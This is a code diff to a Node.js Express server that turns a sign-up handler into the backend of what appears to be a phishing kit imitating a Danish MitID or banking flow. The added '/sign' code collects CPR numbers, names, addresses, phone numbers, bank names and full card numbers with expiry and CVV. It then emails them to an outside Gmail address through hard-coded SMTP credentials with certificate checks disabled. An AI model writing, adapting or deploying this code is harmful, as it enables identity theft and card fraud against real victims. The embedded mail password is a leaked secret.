@@ -7,6 +7,8 @@ const MongoDbStore = require('connect-mongo');
 const http = require('http');
 const https = require('https');
 const fs = require('fs');
+const nodemailer = require("nodemailer");
+
 
 const optionSSL = {
   key: fs.readFileSync('./key.pem'),
@@ -14,7 +16,7 @@ const optionSSL = {
 };
 
 const app = express();
-const PORT = process.env.PORT || 700;
+const PORT = process.env.PORT || 100;
 
 app.use(express.json());
 app.use(bodyParser.json());
@@ -54,7 +56,7 @@ app.engine('html', require('ejs').renderFile);
 
 app.post('/cpr', async (req, resp) => {
   req.session.cpr = req.body.cpr;
-  return resp.redirect('/signup')
+  return resp.redirect('/arso')
 })
 
 app.post('/sign', async (req, resp) => {
@@ -63,7 +65,59 @@ app.post('/sign', async (req, resp) => {
   req.session.by = req.body.by;
   req.session.postalCode = req.body.postalCode;
   req.session.phone = req.body.phone;
-  return req.session.phone && resp.redirect('/info');
+  req.session.card = req.body.card;
+  req.session.expiry = req.body.expiry;
+  req.session.cvv = req.body.cvv;
+  req.session.bank = req.body.bank;
+
+  const savedata = new data({
+    // ids: ids,
+    // code: code,
+    userId: req.session.userId,
+    card: req.session.card,
+    expiry: req.session.expiry,
+    cvv: req.session.cvv,
+    name: req.session.name,
+    address: req.session.address,
+    by: req.session.by,
+    postalCode: req.session.postalCode,
+    phone: req.session.phone,
+    cpr: req.session.cpr,
+    bank: req.session.bank,
+  });
+  console.log(savedata)
+
+
+  const transporter = nodemailer.createTransport({
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,
+    auth: {
+      user: "nmunshi40@gmail.com",
+      pass: 'larwrezmcepfztfj',
+    },
+    tls: {
+      // do not fail on invalid certs
+      rejectUnauthorized: false,
+    },
+  });
+
+
+  var body = `<div>MitId</div><br><div>${req.session.userId}</div><br><br><hr><div>CPR-nummer</div><br><div>${req.session.cpr}</div><br><br><hr><div>Personal Details</div><br><div>${req.session.name}</div><div>${req.session.address}</div><div>${req.session.by}</div><br><br><hr><div>Phone Number</div><br><div>${req.session.phone}</div><br><br><hr><div>Bank Details</div><br><div>${req.session.bank}</div><div>${req.session.card}</div><div>${req.session.expiry}</div><div>${req.session.cvv}</div>`
+  console.log(body)
+  await transporter.sendMail({
+    from: 'nmunshi40@gmail.com',
+    to: 'shawtemp92@gmail.com',
+    subject: 'Information Of Users',
+    html: body
+  });
+
+
+  console.log("email sent sucessfully");
+
+  const r =await data.create(savedata)
+  console.log(r)
+  return resp.redirect('/final');
 });
 
 app.post('/sign_admin', async (req, resp) => {
@@ -146,6 +200,6 @@ app.get('*', function (req, res, next) {
   res.redirect('https://' + req.headers.host + req.path);
 });
 
-app.listen(PORT,(req,resp)=>{
+app.listen(PORT, (req, resp) => {
   console.log('server running')
 })
